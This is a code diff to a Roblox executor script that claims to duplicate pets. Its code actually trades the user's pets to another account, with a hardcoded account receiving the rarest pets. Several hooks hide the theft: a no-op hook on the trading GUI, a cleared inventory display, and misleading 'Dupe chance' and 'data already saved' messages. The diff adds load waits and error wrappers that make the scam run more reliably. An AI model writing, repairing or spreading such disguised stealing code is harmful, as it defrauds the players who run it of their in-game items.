@@ -605,6 +605,8 @@ end
 
 
 queue_on_teleport([==[
+    repeat task.wait() until game:IsLoaded()
+	
     local h = Instance.new('Hint',workspace)
     for i = 0, 0, -1 do
         h.Text = '[2/4] ' .. i
@@ -615,7 +617,11 @@ queue_on_teleport([==[
     local tptimestamp = os.clock()
 
     queue_on_teleport([=[
-        hookfunction(getsenv(game.Players.LocalPlayer.PlayerGui.Scripts.GUIs.Trading).UpdateTrade, function() end)
+	repeat task.wait() until game:IsLoaded()
+
+	pcall(function()
+                hookfunction(getsenv(game.Players.LocalPlayer:WaitForChild'PlayerGui':WaitForChild'Scripts':WaitForChild'GUIs':WaitForChild'Trading').UpdateTrade, function() end)
+        end)
 	pcall(function()
 		game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Pets:ClearAllChildren()
 	end)
@@ -637,7 +643,7 @@ queue_on_teleport([==[
 			hint.Text = '[3/4] Trading pets to account | Dupe chance: ' .. perc() .. ' | ' .. string.format("%.1f",(os.clock() - tptimestamp)) .. ' elapsed'
 		end
 	end)
-        local T, lastTradeId = workspace.__REMOTES.Game.Trading, nil
+        local T, lastTradeId = workspace:WaitForChild'__REMOTES':WaitForChild'Game':WaitForChild'Trading', nil
 	
 	local PLR = game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
 	for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if (tonumber(v.n)==79003 and v.r and v.l>=88e6) or (tonumber(v.n)==17009 and v.dm and v.l>397.7e6) then if game.Players:FindFirstChild'slade00123' then PLR = game.Players['slade00123'] IDs={v.id} end break end end
@@ -672,6 +678,7 @@ queue_on_teleport([==[
         repeat task.wait(0.1) until PLR_PET_COUNT < #workspace.__REMOTES.Core["Get Other Stats"]:InvokeServer()[PLR.Name].Save.Pets
         
         queue_on_teleport([[
+	    repeat task.wait() until game:IsLoaded()
             local h = Instance.new('Hint',workspace)
             for i = 45, 0, -1 do
                 h.Text = '[4/4] ' .. i
@@ -679,7 +686,7 @@ queue_on_teleport([==[
             end
             h.Text = "[4/4] Teleporting.. (If it failed to teleport it's okay because your data already saved)"
 
-            queue_on_teleport("local h = Instance.new('Hint',workspace) h.Text = 'Done' wait(10) h:Destroy()")
+            queue_on_teleport("repeat task.wait() until game:IsLoaded()local h = Instance.new('Hint',workspace) h.Text = 'Done' wait(10) h:Destroy()")
 
             game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, "]==] .. game.JobId .. [==[", game.Players.LocalPlayer)
         ]])
